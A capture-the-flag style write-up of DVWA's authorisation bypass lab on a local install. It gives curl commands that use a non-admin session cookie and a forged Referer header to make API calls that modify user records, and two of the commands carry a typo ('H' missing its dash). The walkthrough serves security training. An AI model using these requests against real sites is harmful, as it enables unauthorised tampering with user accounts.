# DVWA - Authorisation Bypass

## Description

**Vulnerability:** Authorisation Bypass 
**Impact:** Leveraging vulnerabilities to get access to user manager system.

---

## LOW Security Level
The source code doesn't have any checks. You can use `gordonb / abc123` this account (this is not an admin account). Since the source code doesn't have any checks so we can just access to the URL: http://localhost/DVWA/vulnerabilities/authbypass/

![Guide image](./screenshots/1.png)

## MEDIUM Security Level
The source code now updated with a check:
```php
/*

Only the admin user is allowed to access this page.

Have a look at these two files for possible vulnerabilities: 

* vulnerabilities/authbypass/get_user_data.php
* vulnerabilities/authbypass/change_user_details.php

*/

if (dvwaCurrentUser() != "admin") {
    print "Unauthorised";
    http_response_code(403);
    exit;
}
```
Let's take a look at those 2 files, visit `get_user_data.php` we got:
```json
[{"user_id":"1","first_name":"admin","surname":"admin"},{"user_id":"2","first_name":"Gordon","surname":"Brown"},{"user_id":"3","first_name":"Hack","surname":"Me"},{"user_id":"4","first_name":"Pablo","surname":"Picasso"},{"user_id":"5","first_name":"Bobbbb","surname":"Smith"}]
```
And visit `change_user_details.php` got:
```json
{"result":"fail","error":"Only POST requests are accepted"}
```

You can see that we doesn't got any error Unauthourised so this is the vulnerability that API call doesn't check accounts.

Make a POST request `curl -X POST "http://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php" -b "PHPSESSID=<NON_ADMIN_PHPSESSID>"` to `change_user_details.php`, got:
```json
{"result":"fail","error":"Access denied"}
```

For somehow, when I make request normally on browser I don't get that message, however when I make a request through `curl` I got `Access denied`. So I do some investigate with the `admin` account and found that the request with admin account go with a header `Referer: http://localhost/DVWA/index.php` so I add it to my command:
```bash
curl -X POST "http://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php" -b "PHPSESSID=3ce91c8cfb7a6ad94efcd2cb696b8eb3;security=medium" -H "Referer: http://localhost/DVWA/index.php"
```
I don't get `Access denied` so I have passed the check, now pass a correct format to update user details:
```bash
curl -X POST "http://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php" -b "PHPSESSID=3ce91c8cfb7a6ad94efcd2cb696b8eb3;security=medium" -H "Referer: http://localhost/DVWA/index.php" H "Content-Type: application/json" -d '{"id": 5, "first_name": "Bob", "surname": "Smith"}'
```

Got: 
```json
{"result": "ok"}
```

![Guide image](./screenshots/2.png)

## HIGH Security Level
The source code:
```php
/*

Only the admin user is allowed to access this page.

Have a look at this file for possible vulnerabilities: 

* vulnerabilities/authbypass/change_user_details.php

*/

if (dvwaCurrentUser() != "admin") {
    print "Unauthorised";
    http_response_code(403);
    exit;
}
```

For somehow, I can still change user data in HIGH Security Level by commands used in MEDIUM:
- Change user details
```bash
curl -X POST "http://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php" -b "PHPSESSID=3ce91c8cfb7a6ad94efcd2cb696b8eb3;security=high" -H "Referer: http://localhost/DVWA/index.php" H "Content-Type: application/json" -d '{"id": 5, "first_name": "Bob", "surname": "Smith"}'
```
This can be used maybe because the developer forgot to check on POST request.
